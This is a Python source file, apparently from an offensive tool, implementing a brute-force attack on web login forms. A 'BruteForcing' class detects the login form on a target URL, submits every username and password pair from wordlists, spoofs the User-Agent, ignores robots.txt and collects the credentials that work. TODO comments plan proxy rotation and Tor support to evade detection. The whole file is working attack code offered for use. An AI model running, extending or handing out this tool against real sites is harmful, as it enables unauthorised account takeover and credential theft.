import actions, utils, sys, mechanize

##################################################################
#
#	TODO:
#		+) Multi threading
#		+) Better form detection logic
#		+) Better automatic login condition - gmail, etc..
#
#	TODO FURTHER
#		+) Proxy support
#		+) auto parse proxy list, brute forcing multi Proxy
#		+) sock 5, tor support
#
##################################################################

class BruteForcing(object):
	def __init__(self, optionURL, optionUserlist, optionPasslist):
		###############################################################
		#
		#	@Ic3W4ll
		#
		#	varTargetURL: <protocol>://<domain>/<path>
		#	varUserAgent: UserAgents; random choice from file
		#	frmLoginID: ID of login form, for mechanize.Browser().select_form(nr=ID)
		#	frmUsername: Username form's name, get from parse form
		#	frmPassword: Password form's name, get from parse form
		#	lstUsername: Username list, user's option / wordlist
		#	lstPassword: Passowrd list, user's option / wordlist
		#	szPassword:	Password list's size (number of lines/ words)
		#	fndData: Match usernames + passwords
		#
		################################################################

		self.target_url = optionURL
		self.user_agent = actions.action_getUserAgent()
		self.formLoginID = 0
		self.formUsernameField = ''
		self.formPasswordField = ''
		self.lstUsername = optionUserlist
		self.lstPassword = optionPasslist
		self.sizePasslist = actions.subaction_currentTryListSize(self.lstPassword)
		self.credentials = []
		self.actTestConnection()

	def actTestConnection(self):

		#	Create Browser object
		process = mechanize.Browser()
		process.addheaders = [('User-Agent', self.user_agent)]
		process.set_handle_robots(False)

		#	Connecting to Target
		utils.printf("Testing connection....")

		try:
			process.open(self.target_url)
			utils.printf("Connected to URL. Gathering login form information...\n", "good")
			self.formLoginID, self.formUsernameField, self.formPasswordField = actions.action_getFormInformation(process.forms())
			utils.printf("Found login form", "good")
			process.close()

		except TypeError:
			utils.printf("Can not find any login form in %s" %(self.target_url), "bad")
			sys.exit(1)

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			sys.exit(1)

	def actGetResult(self):
		return self.credentials

	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, currentTry):
		try:
			#	Fill Login field Information
			objBrowser.select_form(nr = self.formLoginID)
			objBrowser.form[self.formUsernameField] = tryUsername
			objBrowser.form[self.formPasswordField] = tryPassword

			#	Print progress bar
			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, currentTry, self.sizePasslist))

			#	Send request
			objBrowser.submit()

			#	Refresh page, useful for redirect after login
			objBrowser.reload()

			#	If result has no login form  -> Success **NEED IMPROVE**
			#		add login information to fndData, return True

			if not actions.action_getFormInformation(objBrowser.forms()):
				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
				self.credentials.append([tryUsername, tryPassword])
				return True
			return False

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			sys.exit(1)

	def run(self):
		#Start brute forcing
		###############################
		#	Testing, does not need
		try:
			self.lstUsername.seek(0)
		except:
			pass

		for currentUsername in self.lstUsername:

			currentTry = 0
			currentUsername = currentUsername.replace('\n', '')

			proc = mechanize.Browser()
			proc.addheaders = [('User-Agent', self.user_agent)]
			proc.set_handle_robots(False)
			proc.open(self.target_url)

			#######################################
			#	Read password file from start point
			#
			#######################################
			try:
				self.lstPassword.seek(0)
			except:
				pass

			for currentPassowrd in self.lstPassword:
				currentPassowrd = currentPassowrd.replace('\n', '')

				currentTry += 1
				if self.actTryTargetLogin(proc, currentUsername, currentPassowrd, currentTry):
					break

			if currentTry == self.sizePasslist:
				utils.printf("%s: No match found." %(currentUsername), "bad")
			proc.close()
